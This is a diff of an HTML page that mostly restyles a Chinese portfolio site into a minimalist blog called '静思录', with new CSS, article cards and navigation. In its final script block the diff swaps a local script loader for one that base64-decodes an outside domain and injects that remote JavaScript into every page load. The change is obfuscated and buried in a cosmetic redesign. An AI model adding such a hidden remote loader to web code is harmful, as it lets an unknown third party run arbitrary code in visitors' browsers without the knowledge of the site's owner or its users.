@@ -5,425 +5,379 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>灵感画廊 - 创意作品集</title>
+    <title>静思录</title>
     <style>
+        /* 全局样式 */
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F8F8F8;
-            /* 极浅灰色背景 */
+            background-color: #FDFDFD;
+            /* 纯净的浅色背景 */
             color: #333333;
             /* 深灰色文本 */
-            line-height: 1.7;
+            line-height: 1.8;
+            /* 增加行高，提升可读性 */
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
+            scroll-behavior: smooth;
+            /* 平滑滚动 */
         }
 
         .container {
             max-width: 90%;
+            /* 适应移动端宽度 */
             margin: 0 auto;
-            padding: 30px 0;
+            padding: 25px 15px;
+            /* 增加整体内边距 */
         }
 
-        /* 头部 - 简洁艺术，菜单按钮绝对定位在右上角 */
+        /* 头部样式 */
         header {
-            background-color: #FFFFFF;
-            /* 纯白色头部背景 */
-            padding: 25px 20px;
-            /* 调整内边距 */
             text-align: center;
-            /* 标题居中 */
-            border-bottom: 1px solid #E0E0E0;
-            /* 极细底部边框 */
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.03);
-            position: relative;
-            /* 为内部绝对定位的元素提供参考 */
-            overflow: hidden;
+            padding: 40px 0;
             margin-bottom: 40px;
+            /* 增加底部外边距 */
+            border-bottom: 1px solid #E0E0E0;
+            /* 柔和的分割线 */
         }
 
         header h1 {
-            margin: 0;
-            font-family: 'Playfair Display', serif;
-            /* 优雅标题字体 */
-            font-size: 2.2em;
-            /* 适应顶部条 */
-            color: #333333;
-            letter-spacing: 1px;
-            /* flex-grow removed as header is no longer flex container for h1 */
+            color: #5A5A5A;
+            /* 柔和的深灰色标题 */
+            font-size: 2.8em;
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+            font-weight: 300;
+            /* 更细的字重 */
         }
 
         header p {
-            display: none;
-            /* 副标题在顶部条中隐藏 */
+            color: #777777;
+            font-size: 1.1em;
+            margin: 0;
+            font-style: italic;
+            /* 斜体副标题 */
         }
 
-        /* 菜单切换按钮 - 绝对定位在右上角 */
-        .menu-toggle {
-            background: none;
-            border: none;
-            font-size: 2em;
-            /* 图标大小 */
-            color: #A28C5B;
-            /* 强调色 */
-            cursor: pointer;
-            padding: 5px;
-            position: absolute;
-            /* 绝对定位 */
-            top: 25px;
-            /* 距离顶部 */
-            right: 20px;
-            /* 距离右侧 */
-            z-index: 2;
-            transition: transform 0.3s ease;
-        }
-
-        .menu-toggle:hover {
-            transform: scale(1.1);
-        }
-
-        /* 侧边导航菜单 */
-        nav {
-            position: fixed;
-            top: 0;
-            right: -280px;
-            /* 默认隐藏在屏幕右侧 */
-            width: 250px;
-            /* 菜单宽度 */
-            height: 100%;
-            background-color: #FFFFFF;
-            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
-            transition: right 0.4s ease-in-out;
-            /* 平滑滑入滑出 */
-            z-index: 1001;
-            /* 确保在内容之上 */
-            padding-top: 80px;
-            /* 留出顶部空间 */
-            box-sizing: border-box;
-        }
-
-        nav.is-open {
-            right: 0;
-            /* 菜单打开时滑入 */
-        }
-
+        /* 导航菜单 */
         nav ul {
             list-style: none;
             padding: 0;
-            margin: 0;
+            margin-top: 30px;
             display: flex;
-            flex-direction: column;
-            /* 垂直排列 */
-            gap: 10px;
-            /* 列表项间距 */
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 15px 10px 15px;
         }
 
         nav ul li a {
-            color: #333333;
             text-decoration: none;
-            padding: 15px 20px;
-            /* 增加点击区域 */
-            border-bottom: 1px solid #E0E0E0;
-            /* 列表项分隔线 */
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
-            display: flex;
-            align-items: center;
-            font-weight: 500;
-            font-size: 1.1em;
+            color: #8B7967;
+            /* 强调色：大地色系 */
+            font-weight: bold;
+            padding: 10px 0;
+            /* 底部边框作为强调 */
+            transition: color 0.3s ease, border-bottom-color 0.3s ease;
+            border-bottom: 2px solid transparent;
+            /* 默认透明边框 */
         }
 
-        nav ul li a:hover,
-        nav ul li a:focus {
-            background-color: #F8F8F8;
-            /* 柔和背景 */
-            color: #A28C5B;
-            /* 强调色文字 */
-            transform: translateX(5px);
-            /* 悬停时右移 */
+        nav ul li a:hover {
+            color: #6A5B4E;
+            border-bottom-color: #8B7967;
+            /* 悬停时显示边框 */
         }
 
-        nav ul li:last-child a {
-            border-bottom: none;
-            /* 最后一个没有底部边框 */
-        }
-
-        nav ul li a .icon {
-            font-size: 1.5em;
-            margin-right: 15px;
-            color: #A28C5B;
-            /* 图标强调色 */
-        }
-
-        /* 菜单打开时的背景遮罩 */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.3);
-            /* 半透明黑色 */
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
-        }
-
-        .overlay.is-visible {
-            opacity: 1;
-            visibility: visible;
-        }
-
+        /* 主要内容区 */
         main {
-            padding-top: 30px;
+            padding-top: 0;
         }
 
-        /* 作品卡片 - 柔和阴影与动画 */
-        .project-card {
-            background-color: #FFFFFF;
+        section {
+            padding: 0;
+            /* 移除section默认内边距，让文章卡片控制间距 */
             margin-bottom: 40px;
-            padding: 35px;
-            border-radius: 15px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            opacity: 0;
-            /* 初始隐藏 */
-            transform: translateY(20px);
-            /* 初始位置 */
+            /* 增加section间距 */
         }
 
-        .project-card.fade-in {
-            opacity: 1;
-            transform: translateY(0);
-            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
-        }
-
-        .project-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
-        }
-
-        .project-card h2 {
-            font-family: 'Playfair Display', serif;
+        h2 {
+            color: #5A5A5A;
             font-size: 2.2em;
-            color: #333333;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #E0E0E0;
+            text-align: center;
+            font-weight: 400;
+            /* 正常字重 */
+        }
+
+        h3 {
+            color: #4A4A4A;
+            font-size: 1.8em;
             margin-top: 0;
-            margin-bottom: 15px;
+            /* 移除顶部外边距 */
+            margin-bottom: 10px;
+            font-weight: 500;
+            /* 中等字重 */
         }
 
-        .project-card .category {
-            font-size: 0.9em;
-            color: #999999;
-            margin-bottom: 20px;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .project-card p {
+        p {
+            color: #4A4A4A;
             font-size: 1.05em;
-            color: #666666;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
-        .project-card img {
+        img {
             max-width: 100%;
             height: auto;
+            border-radius: 8px;
+            margin-top: 25px;
+            margin-bottom: 25px;
             display: block;
-            margin: 25px auto;
-            border-radius: 10px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            border: 2px solid #DDDDDD;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
 
-        .view-project {
+        /* 文章卡片样式 */
+        .article-card {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            /* 轻微阴影 */
+            margin-bottom: 30px;
+            /* 文章卡片间距 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .article-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .article-card .date {
+            color: #777777;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+            display: block;
+            font-style: italic;
+        }
+
+        .article-card .read-more {
             display: inline-block;
-            background-color: #A28C5B;
-            /* 强调色按钮 */
+            background-color: #8B7967;
+            /* 强调色 */
             color: #FFFFFF;
-            padding: 12px 28px;
-            border-radius: 5px;
+            padding: 10px 20px;
+            border-radius: 20px;
             text-decoration: none;
             font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+            font-size: 0.95em;
+            transition: background-color 0.3s ease;
         }
 
-        .view-project:hover {
-            background-color: #8D7B4F;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
+        .article-card .read-more:hover {
+            background-color: #6A5B4E;
         }
 
-        /* 页脚 - 简洁淡雅 */
-        footer {
-            background-color: #F0F0F0;
-            /* 略深于背景的浅灰色 */
-            color: #777777;
-            padding: 40px 0;
-            text-align: center;
-            font-size: 0.9em;
-            margin-top: 50px;
+        /* 关于我/联系区 */
+        .about-contact-section {
+            padding-top: 25px;
             border-top: 1px solid #E0E0E0;
-            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
+            /* 分隔线 */
+            text-align: center;
+        }
+
+        .about-contact-section h2 {
+            margin-top: 0;
+            border-bottom: none;
+            /* 移除标题下划线 */
+            padding-bottom: 0;
+        }
+
+        .about-contact-section .profile-img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 20px auto 25px;
+            border: 4px solid #8B7967;
+            /* 强调色边框 */
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .about-contact-section p {
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .contact-info p {
+            margin-bottom: 10px;
+        }
+
+        .contact-info a {
+            color: #8B7967;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .contact-info a:hover {
+            color: #6A5B4E;
+        }
+
+        /* 社交链接 */
+        .social-links {
+            margin-top: 25px;
         }
 
         .social-links a {
-            color: #777777;
+            display: inline-block;
+            margin: 0 12px;
+            color: #8B7967;
+            font-size: 2.2em;
             text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.4em;
-            transition: color 0.3s ease, transform 0.2s ease;
+            transition: transform 0.3s ease;
         }
 
         .social-links a:hover {
-            color: #A28C5B;
-            /* 强调色 */
-            transform: translateY(-3px) scale(1.1);
+            transform: translateY(-5px);
+            color: #6A5B4E;
+        }
+
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 25px 0;
+            color: #999999;
+            font-size: 0.85em;
+            border-top: 1px solid #E0E0E0;
+            margin-top: 40px;
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <header>
-        <div class="container">
-            <h1>灵感画廊</h1>
-            <p>创意与设计的无限可能</p>
-            <button class="menu-toggle" id="menuToggle">&#9776;</button>
-        </div>
-    </header>
-
-    <!-- 侧边导航菜单 -->
-    <nav id="mainNav">
-        <ul>
-            <li><a href="#featured-projects"><span class="icon">&#127912;</span> 精选作品</a></li>
-            <li><a href="#design-gallery"><span class="icon">&#128172;</span> 设计画廊</a></li>
-            <li><a href="#about-me"><span class="icon">&#128100;</span> 关于我</a></li>
-            <li><a href="#contact"><span class="icon">&#128231;</span> 联系</a></li>
-        </ul>
-    </nav>
-
-    <!-- 菜单打开时的背景遮罩 -->
-    <div class="overlay" id="menuOverlay"></div>
-
     <div class="container">
+        <header>
+            <h1>静思录</h1>
+            <p>记录生活中的微光与深思</p>
+            <nav>
+                <ul>
+                    <li><a href="#articles">文章</a></li>
+                    <li><a href="#about">关于我</a></li>
+                    <li><a href="#contact">联系</a></li>
+                </ul>
+            </nav>
+        </header>
+
         <main>
-            <section id="featured-projects" class="project-card">
-                <h2>城市脉动：动态品牌设计</h2>
-                <span class="category">品牌设计 / 动态视觉</span>
-                <img src="https://picsum.photos/300/200?random=1&seed=city-pulse" alt="城市脉动项目" class="random-image">
-                <p>一个为现代都市生活品牌设计的视觉识别系统，强调流动性与活力。项目涵盖标志、字体、色彩和动态图形的应用。</p>
-                <a href="#" class="view-project">查看项目</a>
+            <section id="articles">
+                <h2>最新文章</h2>
+                <!-- 文章一 -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 1 %>" alt="清晨阳光下的书桌">
+                    <h3>极简生活：从整理思绪开始</h3>
+                    <span class="date">发布日期：2023年7月30日</span>
+                    <p>极简主义不仅仅是减少物品，更是一种生活哲学。本文探讨如何通过整理思绪，让内心回归平静，享受“少即是多”的智慧。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
+                <!-- 文章二 -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 2 %>" alt="手冲咖啡的特写">
+                    <h3>慢生活哲学：一杯手冲咖啡的仪式感</h3>
+                    <span class="date">发布日期：2023年7月28日</span>
+                    <p>在快节奏的现代生活中，寻找一份属于自己的仪式感至关重要。一杯手冲咖啡，不仅是味蕾的享受，更是心灵的沉淀。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
+                <!-- 文章三 -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 3 %>" alt="笔记本电脑上的代码和咖啡">
+                    <h3>编程思考：代码之外的艺术</h3>
+                    <span class="date">发布日期：2023年7月25日</span>
+                    <p>编程不仅仅是逻辑与算法，它更像是一门艺术。本文分享我在编码过程中对“美”与“优雅”的追求，以及如何写出富有生命力的代码。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
             </section>
 
-            <section id="design-gallery" class="project-card">
-                <h2>自然回响：UI/UX概念</h2>
-                <span class="category">UI/UX设计 / 概念探索</span>
-                <img src="https://picsum.photos/300/200?random=2&seed=nature-echo" alt="自然回响项目" class="random-image">
-                <p>探索将自然元素融入数字界面，创造平静、直观的用户体验。设计灵感来源于森林、水流和光影的变化。</p>
-                <a href="#" class="view-project">查看项目</a>
+            <section id="about" class="about-contact-section">
+                <h2>关于我</h2>
+                <img src="https://picsum.photos/150/150?random=<%= new Date().getTime() + 4 %>" class="profile-img"
+                    alt="博主个人头像">
+                <p>你好！我是一个热爱生活、喜欢思考和分享的创作者。这个博客是我记录个人成长、生活感悟和兴趣爱好的地方。</p>
+                <p>我相信文字能够传递温度，希望我的分享能为你带来一些启发和宁静。</p>
             </section>
 
-            <section class="project-card">
-                <h2>未来之声：插画系列</h2>
-                <span class="category">数字插画 / 艺术创作</span>
-                <img src="https://picsum.photos/300/200?random=3&seed=future-sound" alt="未来之声插画" class="random-image">
-                <p>一系列以科技与自然融合为主题的数字插画，通过独特的色彩和构图，描绘未来世界的和谐图景。</p>
-                <a href="#" class="view-project">查看项目</a>
+            <section id="contact" class="about-contact-section">
+                <h2>联系方式</h2>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">GitHub</a> |
+                    <a href="#" aria-label="Twitter">Twitter</a> |
+                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
+                </div>
             </section>
         </main>
-    </div>
 
-    <footer>
-        <div class="container">
-            <p>&copy; 2025 灵感画廊. 版权所有.</p>
-            <div class="social-links">
-                <a href="#" target="_blank">Behance</a> |
-                <a href="#" target="_blank">Dribbble</a> |
-                <a href="#" target="_blank">Instagram</a>
+        <footer>
+            <p>&copy; 2023 静思录. All rights reserved.</p>
+        </footer>
+        <div id="overlay">
+            <div id="loading_box" class="loading_container">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
             </div>
-        </div>
-    </footer>
-    <div id="overlay">
-        <div id="loading_box" class="loading_container">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
         </div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            const menuToggle = document.getElementById('menuToggle');
-            const mainNav = document.getElementById('mainNav');
-            const menuOverlay = document.getElementById('menuOverlay');
-
-            function toggleMenu() {
-                mainNav.classList.toggle('is-open');
-                menuOverlay.classList.toggle('is-visible');
-            }
-
-            menuToggle.addEventListener('click', toggleMenu);
-            menuOverlay.addEventListener('click', toggleMenu);
-
-            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
-                anchor.addEventListener('click', function (e) {
-                    e.preventDefault();
-
-                    const targetId = this.getAttribute('href').substring(1);
-                    const targetElement = document.getElementById(targetId);
-
-                    if (targetElement) {
-                        // Adjust scroll offset to account for header height
-                        window.scrollTo({
-                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
-                            behavior: 'smooth'
-                        });
-                        toggleMenu(); // Close menu after clicking a link
-                    }
-                });
+        // 平滑滚动到锚点
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
+                        behavior: 'smooth'
+                    });
+                }
             });
+        });
 
-            const projectCards = document.querySelectorAll('.project-card');
-
-            const observerOptions = {
-                root: null,
-                rootMargin: '0px',
-                threshold: 0.1
-            };
-
-            const observer = new IntersectionObserver((entries, observer) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('fade-in');
-                        observer.unobserve(entry.target);
-                    }
-                });
-            }, observerOptions);
-
-            projectCards.forEach(card => {
-                observer.observe(card);
+        // 动态更新图片时间戳，防止缓存
+        document.addEventListener('DOMContentLoaded', function () {
+            const images = document.querySelectorAll('img[src*="picsum.photos"]');
+            images.forEach(img => {
+                const url = new URL(img.src);
+                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000));
+                img.src = url.toString();
             });
         });
     </script>
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
